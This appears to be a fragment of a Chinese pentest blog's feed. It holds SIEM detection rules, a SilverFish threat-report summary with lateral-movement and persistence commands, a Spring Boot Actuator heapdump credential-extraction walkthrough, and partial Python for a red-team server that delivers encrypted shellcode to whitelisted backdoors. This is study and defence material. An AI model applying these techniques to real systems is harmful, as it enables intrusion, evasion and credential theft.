RunDLL32<br>规则介绍：不正常的rundll32.exe活动（通常用在启动木马过程中，比如CS的Spawn）</p><pre class="line-numbers language-none"><code class="language-none">sequence with maxspan&#x3D;1h  [process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and     (process.name : &quot;rundll32.exe&quot; or process.pe.original_file_name &#x3D;&#x3D; &quot;RUNDLL32.EXE&quot;) and      process.args_count &#x3D;&#x3D; 1  ] by process.entity_id  [process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.parent.name : &quot;rundll32.exe&quot;  ] by process.parent.entity_id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>规则名称：Creation of a Hidden Local User Account<br>规则介绍：添加隐藏账户（用于权限维持）</p><pre class="line-numbers language-none"><code class="language-none">registry where registry.path : &quot;HKLM\\SAM\\SAM\\Domains\\Account\\Users\\Names\\*$\\&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p>规则名称：Windows Script Executing PowerShell<br>规则介绍：使用wscript或者cscript执行Powershell</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and  process.parent.name : (&quot;cscript.exe&quot;, &quot;wscript.exe&quot;) and process.name : &quot;powershell.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><p>规则名称：Windows Suspicious Command<br>规则介绍：Windows可疑命令</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) andprocess.pe.original_file_name in (&quot;whoami.exe&quot;, &quot;tasklist.exe&quot;, &quot;ipconfig.exe&quot;, &quot;powershell.exe&quot;, &quot;sctasks.exe&quot;, &quot;bitsadmin.exe&quot;, &quot;netstat.exe&quot;, &quot;systeminfo.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><p>规则名称：Security Software Discovery using WMIC<br>规则介绍：使用wmic查询安全软件</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and   (process.name:&quot;wmic.exe&quot; or process.pe.original_file_name:&quot;wmic.exe&quot;) and    process.args:&quot;&#x2F;namespace:\\\\root\\SecurityCenter2&quot; and process.args:&quot;Get&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><p>规则名称：Net command via SYSTEM account<br>规则介绍：以SYSTEM权限执行net.exe</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and  user.id in (&quot;S-1-5-18&quot;, &quot;S-1-5-19&quot;, &quot;S-1-5-20&quot;) and  process.name : &quot;whoami.exe&quot; or  (process.name : &quot;net1.exe&quot; and not process.parent.name : &quot;net.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/SigmaHQ/sigma">sigma</a>(Generic Signature Format for SIEM Systems)，这种描述方式特别像病毒软件的特征码。</p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><ul><li>绕过的方式应该还有很多，未测试</li><li>安骑士的原理类似，比如碰到过阿里云上执行<code>whoami、systeminfo</code>就告警</li><li>看完<a href="http://weizn.net/?p=439">通过SYSMON日志检测Cobalt Strike木马</a>我觉得这个才是SIEM的解决方式</li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://unicornsec.com/home/siem-home-lab-series-part-1">SIEM实验系列-1</a></li><li><a href="https://unicornsec.com/home/siem-home-lab-series-part-2">SIEM实验系列-2</a></li><li><a href="https://unicornsec.com/home/siem-home-lab-series-part-3">SIEM实验系列-3</a></li><li><a href="http://weizn.net/?p=439">通过SYSMON日志检测Cobalt Strike木马</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Silver调查报告</title>
      <link href="/2021/07/29/silverFish.html"/>
      <url>/2021/07/29/silverFish.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.prodaft.com/m/reports/SilverFish_TLPWHITE_v2.pdf">SilverFish_TLPWHITE</a></p></blockquote><h1 id="起点"><a href="#起点" class="headerlink" title="起点"></a>起点</h1><p>根据FireEye发布的IOC，有一个域名是databasegalore.com，这个域名下的IP在2304端口起了PowerMTA服务，web目录扫描之后发现example.php。PTI团队根据这两个网页的设备指纹和PowerMTA服务，扫描了全网的IPv4地址，发现一个IP地址: <code>81.4.122.203</code>，然后PTI团队对IP下的C段进行渗透测试，发现<code>81.4.122.101</code>存在一个C2服务器。</p><h3 id="C2分析"><a href="#C2分析" class="headerlink" title="C2分析"></a>C2分析</h3><p><img src="/2021/07/29/silverFish/silver_C2.png"></p><p>收集信息如下：</p><ul><li>ID</li><li>UUID</li><li>Instance</li><li>IP</li><li>Country</li><li>Domain\User@Computer</li><li>OS</li><li>Build</li><li>Architecture</li><li>Antivirus</li><li>Is Admin</li><li>Integrity Level</li><li>UAC Setting</li><li>ConsentPromptBehaviorAdmin • PromptOnSecureDesktop</li><li>First visit</li></ul><p>每个受害者页面都可以发送攻击指令，有如下：<br><img src="/2021/07/29/silverFish/silver_command.png"></p><p>看了下是命令执行和UAC绕过比较多，C2服务器的防护措施有如下：</p><ul><li>使用AppArmor隔离环境</li><li>关闭访问日志（web日志、SSH登录日志、命令行日志）</li><li>使用IPTABLES只允许白名单IP访问</li></ul><p><img src="/2021/07/29/silverFish/silver_ip.png"></p><h3 id="TDS-Traffic-Distrbution-System-系统分析"><a href="#TDS-Traffic-Distrbution-System-系统分析" class="headerlink" title="TDS(Traffic Distrbution System)系统分析"></a>TDS(Traffic Distrbution System)系统分析</h3><p>  是一个类似负载均衡的系统，可以把受害者的流量定向到不同的C2服务器，因为受害者大概有4千多个，同时这个系统可以根据国家来分组，并且类似JIRA的系统，指定受害者给不同的黑客。<br>  <img src="/2021/07/29/silverFish/tds.png"></p><p> 流量分发系统的一部分是由可信网站组成的，这种网站被黑了之后，加入php和js代码，判断每个请求是否符合一定的特征，符合特征之后会向特定网站发送一个GET请求。</p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><ul><li>常用命令<ul><li>nltest /dclist  列域控</li><li>nltest /domain_trusts</li><li>cmdkey /list  列已存储的密码</li><li>net group “domain admins” /domain  查看域控管理员</li><li>powershell -nop -enc xxx  执行命令</li></ul></li></ul><p><img src="/2021/07/29/silverFish/silver_post.png"></p><p>使用的其中一个横向工具是Koadic，一般通过mshta运行混淆之后的脚本：<br><img src="/2021/07/29/silverFish/silver_koadic.png"></p><h4 id="cobaltstrike"><a href="#cobaltstrike" class="headerlink" title="cobaltstrike"></a>cobaltstrike</h4><p>cobaltstrike使用了域前置的技术，比如<code>twimg-us.azureedge.net</code>, <code>d3ser9acyt7cdp.cloudfront.net</code>，其中一个上线的方式是使用msbuild：<code>C:\Windows\Microsoft.Net\Framework64\v4.0.30319\msbuild.exe C:\ms654.csproj</code><br><img src="/2021/07/29/silverFish/silver_cdn.png"></p><h3 id="VictimTotal-Sandbox"><a href="#VictimTotal-Sandbox" class="headerlink" title="VictimTotal Sandbox"></a>VictimTotal Sandbox</h3><p>研究人员发现的最震惊的Web平台，SilverFish使用受害者作为杀软测试云端平台，控制了超过6000个设备主机，不定期测试木马脚本的免杀性。</p><p><img src="/2021/07/29/silverFish/silver_sandbox.png"></p><p>Powershell脚本的编码是这样的: 使用6字节的key做一次xor–&gt;base64编码–&gt;AES加密–&gt;混淆。</p><h3 id="NetSupportManager"><a href="#NetSupportManager" class="headerlink" title="NetSupportManager"></a>NetSupportManager</h3><p>把NetSupportManager程序里面的client32.exe重命名为ctfmon.exe，然后设置持久化后门：<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run </code></p><h3 id="读后感"><a href="#读后感" class="headerlink" title="读后感"></a>读后感</h3><ul><li>高度的组织化，具有代表性的TDS系统</li><li>C2界面很简洁</li><li>云沙盒的概念真厉害</li><li>很好奇怎么日进去的，域前置的域名为啥是Oracle的？</li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot Actuator漏洞复现</title>
      <link href="/2021/05/27/spring-boot-actuator.html"/>
      <url>/2021/05/27/spring-boot-actuator.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-基本知识"><a href="#0x01-基本知识" class="headerlink" title="0x01. 基本知识"></a>0x01. 基本知识</h3><ol><li>在pom.xml里面有这样的配置</li></ol><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;   &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;   &lt;artifactId&gt;spring-boot-starter-actuator&lt;&#x2F;artifactId&gt;   &lt;exclusions&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>没有开启安全设置</li></ol><pre class="line-numbers language-none"><code class="language-none">management:  security:    enabled: false  health:    elasticsearch:      enabled: false  metrics:    export:      prometheus:        enabled: true      jmx:        enabled: true  endpoints:    web:      exposure:        include: &#39;*&#39;      base-path: &#x2F;auto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>服务端可以通过修改配置文件来改变Actuator的根路径：<code>management.endpoints.web.base-path=/monitor</code></p><p>  搜索github的源代码，可以看到类似的设置：</p><h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><p>在配置不当的时候，可能暴露以下路由:</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;actuator&#x2F;auditevents&#x2F;autoconfig&#x2F;beans&#x2F;caches&#x2F;conditions&#x2F;configprops&#x2F;docs&#x2F;dump&#x2F;env&#x2F;flyway&#x2F;health&#x2F;heapdump&#x2F;httptrace&#x2F;info&#x2F;intergrationgraph&#x2F;jolokia&#x2F;logfile&#x2F;loggers&#x2F;liquibase&#x2F;metrics&#x2F;mappings&#x2F;prometheus&#x2F;refresh&#x2F;scheduledtasks&#x2F;sessions&#x2F;shutdown&#x2F;trace&#x2F;threaddump&#x2F;actuator&#x2F;auditevents&#x2F;actuator&#x2F;beans&#x2F;actuator&#x2F;health&#x2F;actuator&#x2F;conditions&#x2F;actuator&#x2F;configprops&#x2F;actuator&#x2F;env&#x2F;actuator&#x2F;info&#x2F;actuator&#x2F;loggers&#x2F;actuator&#x2F;heapdump&#x2F;actuator&#x2F;threaddump&#x2F;actuator&#x2F;metrics&#x2F;actuator&#x2F;scheduledtasks&#x2F;actuator&#x2F;httptrace&#x2F;actuator&#x2F;mappings&#x2F;actuator&#x2F;jolokia&#x2F;actuator&#x2F;hystrix.stream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以通过<code>/heapdump</code>这个节点获取内存，然后使用<a href="https://www.eclipse.org/mat/downloads.php">Memory Analyzer</a>分析内存，获取敏感信息，常用查询：</p><pre class="line-numbers language-none"><code class="language-none">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))或select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))  select* from java.util.Hashtable$Entry x WHERE(toString(x.key).contains(&quot;username&quot;))select* from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))select* from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;url&quot;))select* from java.lang.String s WHERE toString(s) LIKE &quot;.*password.*&quot;select* from org.springframework.web.context.support.StandardServletEnvironmentselect* from java.lang.String s WHERE toString(s) LIKE &quot;.*SESSION.*&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ul><li>参考链接里面，当下载/heapdump是403的时候, <code>/heapdump.json</code>可以下载成功，这个在spring启动的时候可以看到路由，所有的节点信息都存在<code>.json</code>路径</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://github.com/LandGrey/SpringBootVulExploit">SpringBootVulExploit</a></li><li><a href="https://mp.weixin.qq.com/s/sJAyhQQvGqG-SliSGbhJNA">渗透大型菠菜网站鸭脖</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>防御性C2玩具尝试</title>
      <link href="/2021/04/06/defense-from-c2.html"/>
      <url>/2021/04/06/defense-from-c2.html</url>
      
        <content type="html"><![CDATA[<h3 id="背景需求"><a href="#背景需求" class="headerlink" title="背景需求"></a>背景需求</h3><p>不管一个什么形式的后门：定时任务、dll劫持、开机启动…，当我设置的后门运行的时候，我想掌握后门的启动时间、触发IP等上环境，所以这篇文章是在shellcode分离免杀的基础上做了尝试性扩展</p><h4 id="考虑这样的场景："><a href="#考虑这样的场景：" class="headerlink" title="考虑这样的场景："></a>考虑这样的场景：</h4><ul><li>后门被静态分析</li><li>后门被动态分析</li><li>shellcode被提取之后触发</li><li>…</li></ul><p>在shellcode分离免杀的基础上扩展还是比较容易的，当客户端请求远程shellcode托管服务器的时候，增加一个机器人，然后发起一个上线通知：If This Then That，这样太简单了，我们再多加点料，比如：</p><ol><li>不带合理参数请求shellcode的URL时候，发起警告</li><li>当木马运行在恶意环境的时候，发起警告<ul><li>当木马上线IP不在服务端列表</li><li>当木马上线主机的设备指纹不在服务端列表</li></ul></li><li>shellcode托管服务随时可以关闭打开</li><li>shellcode托管服务随时可以新增删除木马上线IP或者设备指纹</li></ol><h3 id="准备材料"><a href="#准备材料" class="headerlink" title="准备材料"></a>准备材料</h3><ul><li>一台VPS：托管shellcode，通知slack机器人</li><li>一个AWS账号隐藏C2（CloudFront）</li><li>Slack：接收通知，使用<code>Slash commands</code>功能控制shellcode托管服务</li></ul><h5 id="托管shellcode流程"><a href="#托管shellcode流程" class="headerlink" title="托管shellcode流程"></a>托管shellcode流程</h5><p><img src="/2021/04/06/defense-from-c2/18.png"></p><h5 id="Slack通知"><a href="#Slack通知" class="headerlink" title="Slack通知"></a>Slack通知</h5><p><img src="/2021/04/06/defense-from-c2/slack.png"></p><h5 id="Slash-Command"><a href="#Slash-Command" class="headerlink" title="Slash Command"></a>Slash Command</h5><p><img src="/2021/04/06/defense-from-c2/9.png"></p><p>这个点是从TG上社工库跑路得来的思路，当执行任何一个命令的时候，都会发起一个请求到VPS，然后VPS处理请求。<br>在slack里面增加<code>slach commands</code>:</p><ul><li><code>/boot</code> 开启shellcode托管服务</li><li><code>/delete</code> 删除IP白名单，<code>/delete ip 127.0.0.1</code> </li><li><code>/info</code> 获取托管shellcode服务器的状态</li><li><code>/add</code> 增加IP白名单，<code>/add ip 127.0.0.1</code></li><li><code>/shutdown</code> 关闭shellcode托管服务器</li></ul><p>大概流程是这样，IP白名单直接使用redis来存储，可以设置一个IP为<code>*</code>的时候，任何IP都能上线。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/curd'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@verify_check</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    command <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"command"</span><span class="token punctuation">]</span>    text <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span>    l <span class="token operator">=</span> text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>get_switch<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The Command is &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The Text is &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"db status &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>get_agent_status<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> command <span class="token operator">==</span> <span class="token string">"/add"</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> l<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"ip"</span><span class="token punctuation">:</span>            redis<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">"ip_&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>l<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            msg <span class="token operator">=</span> set_msg<span class="token punctuation">(</span><span class="token string">"增加 &#123;&#125;成功, 状态: &#123;&#125;\n当前数据库: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>l<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> l<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> get_agent_status<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            robot<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>verify_check</code>是验证请求是否从slack发起的，完整代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">verify_check</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token decorator annotation punctuation">@wraps</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment"># https://api.slack.com/authentication/verifying-requests-from-slack</span>            <span class="token comment"># https://slack.dev/python-slack-sdk/oauth/index.html#app-installation-flow</span>            <span class="token comment"># if request.form and request.form['token'] == "":</span>            slack_signing_secret <span class="token operator">=</span> <span class="token string">'secret'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            timestamp <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'X-Slack-Request-Timestamp'</span><span class="token punctuation">]</span>            request_body <span class="token operator">=</span> request<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            <span class="token comment"># print("request data &#123;&#125;".format(request.get_data()))</span>            <span class="token comment"># print(request.values)</span>            <span class="token comment"># request_body = urlencode(request.values)</span>            <span class="token comment"># print("request data is &#123;&#125;".format(request_body))</span>            sig_basestring <span class="token operator">=</span> <span class="token string">'v0:'</span> <span class="token operator">+</span> timestamp <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> request_body            <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">float</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">"Resource not found"</span><span class="token punctuation">)</span>            my_signature <span class="token operator">=</span> <span class="token string">'v0='</span> <span class="token operator">+</span> hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>                slack_signing_secret<span class="token punctuation">,</span>                sig_basestring<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                hashlib<span class="token punctuation">.</span>sha256            <span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            slack_signature <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'X-Slack-Signature'</span><span class="token punctuation">]</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>my_signature<span class="token punctuation">,</span> slack_signature<span class="token punctuation">)</span>            <span class="token keyword">if</span> hmac<span class="token punctuation">.</span>compare_digest<span class="token punctuation">(</span>my_signature<span class="token punctuation">,</span> slack_signature<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">"Resource not found"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">"Resource not found"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> wrapper<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="shellcode托管伪代码"><a href="#shellcode托管伪代码" class="headerlink" title="shellcode托管伪代码"></a>shellcode托管伪代码</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/i-am-unreachable'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment"># 静态分析警告</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>getlist<span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>getlist<span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">not</span> post_validate<span class="token punctuation">(</span>v<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> request_data <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>        user_agent <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">)</span>        method <span class="token operator">=</span> request<span class="token punctuation">.</span>method        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> get_switch<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 开关关闭状态</span>        msg_fail<span class="token punctuation">(</span>now<span class="token punctuation">,</span> domain<span class="token punctuation">,</span> user<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> c2_info<span class="token punctuation">,</span> <span class="token string">"服务器托管开关关闭，打开请发送指令: **/boot**"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> not_found<span class="token punctuation">(</span><span class="token punctuation">)</span>    ip_str <span class="token operator">=</span> <span class="token string">"ip_&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span>    <span class="token keyword">if</span> check<span class="token punctuation">(</span>ip_str<span class="token punctuation">)</span><span class="token punctuation">:</span>        shell_str <span class="token operator">=</span> <span class="token string">"shell_&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>server<span class="token punctuation">)</span>        msg_success<span class="token punctuation">(</span>now<span class="token punctuation">,</span> domain<span class="token punctuation">,</span> user<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> c2_info<span class="token punctuation">)</span>        encrypt <span class="token operator">=</span> encrypt_shell<span class="token punctuation">(</span>key<span class="token punctuation">,</span> redis<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shell_str<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>encrypt<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'text/plain'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h3><ol><li>我直接选择IP作为白名单，当IP在白名单，并且shellcode托管开关打开的时候，发送shellcode。深入一点可以使用Machine Key作为判断决策，比如<code>HKLM\SOFTWARE\Microsoft\Cryptography</code>，在木马初次运行的时候发送Key到服务端，之后每次运行的时候都检测是否在服务端的名单里面。</li><li>dll可以使用socket分离shellcode，思路和上面一样。socket服务器的隐藏可以选择AWS的ELB(<del>有点贵</del>)类似的加速服务</li></ol><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://idiotc4t.com/persistence/zhu-ji-te-zheng-bang-ding-mu-ma">主机特征绑定木马</a></li><li><a href="https://github.com/i-saint/scribble/blob/8318bd26adfcb8f26ed8c428e43769d48e75bfbc/MachineGUID.cpp">Github MachineGuid</a></li><li><a href="https://github.com/captainwong/jlib/blob/0b41c6deaa2acaf1642d9b54f6ebd2944f114f13/jlib/win32/DeviceUniqueIdentifier.h">Github DeviceUniqueIdentifier</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Lambda远程命令执行测试</title>
      <link href="/2021/04/01/aws-lambda-rce.html"/>
      <url>/2021/04/01/aws-lambda-rce.html</url>
      
